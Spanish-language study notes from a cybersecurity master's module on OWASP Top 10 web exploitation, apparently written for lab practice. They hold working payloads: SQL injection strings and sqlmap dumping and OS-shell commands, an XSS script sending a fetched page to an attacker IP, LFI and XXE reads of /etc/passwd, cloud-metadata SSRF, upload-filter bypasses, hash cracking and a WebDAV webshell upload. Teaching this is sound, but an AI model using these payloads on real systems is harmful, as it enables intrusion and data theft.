> [!info] Ficha técnica
> **Programa:** Máster en Ciberseguridad — Evolve Academy
> **Bloque:** 04 — Explotación Web (OWASP Top 10)
> **Contenido:** Metodología de auditoría web, fuzzing, SQLi, XSS, LFI/Path Traversal, SSRF, XXE, File Upload y CMS — con comandos y payloads reales

> [!tip] Cómo leer estos apuntes
> Este bloque es el núcleo ofensivo del máster: las 10 vulnerabilidades OWASP Top 10 con comandos reales, desde la detección manual hasta la automatización con herramientas. Cada sección incluye payloads probados en clase.

---

## ① El OWASP Top 10 como mapa de vulnerabilidades web

| Código | Vulnerabilidad | Descripción |
|--------|---------------|-------------|
| **A01** | Control de Acceso Roto | Usuarios acceden a recursos no autorizados |
| **A02** | Fallos Criptográficos | Cifrado débil o datos en texto claro |
| **A03** | Inyecciones | SQL, comandos del sistema |
| **A04** | Diseño Inseguro | — |
| **A05** | Fallos de Configuración de Seguridad | — |
| **A06** | Componentes Obsoletos y Vulnerables | — |
| **A07** | Fallos de Identificación y Autenticación | — |
| **A08** | Fallos de Integridad de Software y Datos | — |
| **A09** | Fallos de Registro y Monitoreo | — |
| **A10** | SSRF (Server-Side Request Forgery) | — |

---

## ② Fuzzing y enumeración de rutas

```bash
gobuster dir -u https://objetivo -w /usr/share/wordlists/dirb/common.txt
feroxbuster --url http://objetivo
gobuster vhost -u http://dominio.htb -w subdomains-top1million-20000.txt --append-domain
```

### Códigos de respuesta clave

| Código | Significado | Acción |
|--------|-------------|--------|
| **200** | Existe y responde | Contenido interesante |
| **403** | Existe pero prohibido | Sigue siendo información valiosa |
| **301** | Redirección | Seguir la redirección |
| **404** | No existe | Descartar |

> [!warning] Falsos positivos
> Si el servidor redirige todos los errores al index, puede parecer que "todo existe" — conviene filtrar por tamaño de respuesta.

El fuzzing de **virtual hosts** (`--append-domain` concatena el prefijo del diccionario con el dominio real, ej: `s3` + `.thetoppers.htb` = `s3.thetoppers.htb`) descubre subdominios que comparten IP pero se distinguen por la cabecera Host.

---

## ③ SQL Injection (SQLi) — de la detección manual a SQLMap

### Detección manual

En un campo de búsqueda o login, probar:

```sql
' OR '1'='1
' OR 1=1 ---
admin' --
```

Si la aplicación devuelve un error SQL detallado, hay inyección.

### ENUMERACIÓN con UNION-based

```sql
' ORDER BY 1-- # se incrementa el número hasta que falla: cuenta columnas
' UNION SELECT 1,2,3-- # ubica en qué columna se refleja la salida
' UNION SELECT null,version(),null-- # muestra la versión del motor
```

### Automatización con SQLMap

Capturar la petición completa desde Burp Suite (incluyendo cookie de sesión):

```bash
sqlmap -u "http://host/dashboard.php?search=a" --cookie="PHPSESSID=<sesion>" --dbs
sqlmap -u "http://host/dashboard.php?search=a" --cookie="PHPSESSID=<sesion>" \
 -D pg_catalog --tables
sqlmap -u "http://host/dashboard.php?search=a" --cookie="PHPSESSID=<sesion>" \
 -D <DB> -T <tabla> --dump
sqlmap -u "http://host/dashboard.php?search=a" --cookie="..." --os-shell

# Con petición capturada en archivo (más fiable con cookies/headers complejos):
sqlmap -r request.txt --batch --dbs
```

---

## ④ Cross-Site Scripting (XSS)

### Payload de detección

```html
<script>alert(1)</script>
<img src=x onerror=alert(document.cookie)>
```

> [!important] El valor real del XSS
> No está en el `alert()`, sino en el mecanismo de **delivery**: cómo se consigue que otro usuario (idealmente un administrador) lo ejecute.

### Cadena completa vista en clase

1. Un **Markdown Viewer** permite subir contenido con `<script>`.
2. La aplicación ofrece un botón "Share" que genera un enlace compartible → ese enlace es el **vector de entrega**.

### Confirmar interacción del administrador

Levantar un servidor HTTP local y comprobar si llega una petición:

```bash
python3 -m http.server 8000
# Enviar por el formulario de contacto: http://TU_IP:8000/track
# Si aparece un GET en el log del servidor, el admin ha abierto el enlace.
```

### Exfiltración de datos

Una vez confirmada la interacción, forzar al navegador de la víctima a hacer `fetch()` hacia una ruta restringida y exfiltrar el contenido codificado en Base64:

```html
<script>
fetch('/message.php')
 .then(r => r.text())
 .then(t => fetch('http://TU_IP:8000/exfil?data=' + btoa(t)));
</script>
```

> [!note]
> Base64 **no es cifrado**: es solo un envoltorio para transportar contenido sin romper el formato de la petition (carácteres especiales, saltos de línea).

---

## ⑤ Path Traversal y Local File Inclusion (LFI)

Cuando un parámetro tiene la función de cargar un archivo (`?file=documento.txt`), la pregunta correcta es qué vulnerabilidades encajan con esa función — no probar SQLi o XSS a ciegas.

```bash
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd # bypass de filtros simples de "../"
?file=php://filter/convert.base64-encode/resource=index.php # LFI a RCE en PHP
```

### Impacto típico

Leer archivos de configuración de Apache (`sites-enabled`) para descubrir rutas reales, vhosts adicionales o ficheros de credenciales como `.htpasswd`:

```bash
# .htpasswd contiene algo como: usuario: $apr1$salt$hash
hashid hash_extraido.txt # identificar el tipo de hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_htpasswd.txt
hashcat -m 1600 hash_htpasswd.txt /usr/share/wordlists/rockyou.txt # apr1 MD5
```

---

## ⑥ SSRF, XXE y File Upload

### SSRF (Server-Side Request Forgery)

Forzar al propio servidor a hacer peticiones hacia sistemas internos normalmente inaccesibles desde fuera:

```bash
?url=http://169.254.169.254/latest/meta-data/ # metadata interna en cloud
```

### XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

### File Upload: bypass de validación

Las validaciones por **blacklist** (bloquear extensiones prohibidas) se saltan con:

| Técnica | Ejemplo |
|---------|---------|
| Doble extensión | `shell.php.jpg` |
| Variación de mayúsculas | `shell.pHp` |
| Null byte (sistemas antiguos) | `shell.php%00.jpg` |
| Cambiar cabecera MIME | `Content-Type: image/jpeg` (con Burp Suite) |

> [!important] Whitelist correcta
> El servidor debe validar: extensión real, MIME, firma mágica del archivo, tamaño, y guardar fuera del webroot con nombre renombrado.

---

## ⑦ Bypass de WebDAV en Windows/IIS: PUT + MOVE

Cuando el servidor bloquea subir directamente un `.aspx` pero permite PUT de un `.txt` y MOVE para renombrar:

```bash
# Comprobar métodos permitidos
curl -X OPTIONS http://objetivo -i

# Probar con DavTest qué extensiones se pueden subir y ejecutar
davtest -url http://objetivo

# Subir un .txt con curl y renombrar a .aspx con MOVE
curl -T webshell.txt http://objetivo/webshell.txt
curl -X MOVE --header "Destination:http://objetivo/webshell.aspx" \
 http://objetivo/webshell.txt
```

---

## ⑧ Cadenas de ataque web completas

El valor real de una auditoría está en **encadenar hallazgos pequeños** hasta lograr impacto:

```
XSS → robo de sesión de admin → acceso a ruta con LFI →
credenciales filtradas → acceso SSH al servidor
```

> [!important] Objetivo
> Practicar esta cadena completa — desde la enumeración inicial hasta la explotación final — es el objetivo de los laboratorios integrales de web de este bloque.

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../Apuntes/05 - Auditoria Web/OWASP Top 10 - CVE CVSS CWE.md|OWASP Top 10 - CVE CVSS CWE]— SQL Injection, SSRF, XSS
- [[../Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE — XML External Entity]— File Upload, SSRF, XXE
- [[../Apuntes/08 - Metodologías/Metodologia - Aplicaciones Web.md|Metodologia - Aplicaciones Web]— SSRF, XSS, XXE
- [[../apuntes Joselu/MODULO3/resumen_master_clase48.md|resumen_master_clase48]— SQL Injection, SSRF, XXE
- [[../apuntes Joselu/MODULO3/resumen_master_clase36.md|resumen_master_clase36]— SSRF, XSS, XXE
- [[../apuntes Andres/20.07.2026 PortSwigger SSRF.md|20.07.2026 PortSwigger SSRF]— SQL Injection, SSRF, XXE

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/SQLMap|SQLMap]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/SSRF — Server-Side Request Forgery.md|SSRF]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #burpsuite #file-upload #lfi #pentest #sqli #sqlmap #ssrf #windows #xss #xxe
